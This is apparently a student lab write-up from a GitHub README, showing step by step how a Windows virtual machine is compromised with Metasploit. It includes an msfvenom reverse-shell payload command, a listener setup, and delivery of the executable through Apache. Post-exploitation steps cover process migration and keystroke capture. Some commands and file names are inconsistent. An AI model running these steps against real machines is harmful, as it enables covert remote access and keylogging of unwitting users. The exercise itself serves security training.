# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="642" height="355" alt="image" src="https://github.com/user-attachments/assets/15043968-9f5c-43e8-9205-e26214cb562f" />




Create a malicious executable file nishaj.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15-f exe > nishaj.exe```

### Output:

<img width="826" height="150" alt="image" src="https://github.com/user-attachments/assets/9166c2f7-2adc-4080-a5fd-fc4ac05835ab" />



copy the fun.exe into the apache ```/var/www/html ```folder



<img width="305" height="44" alt="image" src="https://github.com/user-attachments/assets/bbfe19b1-9487-4d4d-becc-6bc78dfcecaf" />


Start apache server ```sudo systemctl apache2 start```


<img width="266" height="43" alt="image" src="https://github.com/user-attachments/assets/97568b08-9773-4183-9f49-ef49f2ccca18" />




Check the status of apache2 ```sudo apache2 status```


<img width="778" height="264" alt="image" src="https://github.com/user-attachments/assets/935555ce-16f1-4c99-af75-d4ac39b3a518" />


Invoke msfconsole:


<img width="609" height="322" alt="image" src="https://github.com/user-attachments/assets/c9aaa4d1-c3a7-4634-b043-2b7e9c9eabef" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


<img width="805" height="270" alt="image" src="https://github.com/user-attachments/assets/0dd461c9-eac5-4577-b527-c613a69b44b9" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 

<img width="592" height="157" alt="image" src="https://github.com/user-attachments/assets/078473de-7c30-45a4-894c-e74b73a3c64c" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/nishaj.exe``` The file "nishaj.exe" downloads.


<img width="940" height="900" alt="image" src="https://github.com/user-attachments/assets/fc4096f9-39df-4926-b158-ec56dbae7eec" />


<img width="614" height="498" alt="image" src="https://github.com/user-attachments/assets/9b4ab0c8-3b24-4c9a-9f10-0c6432ead556" />



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

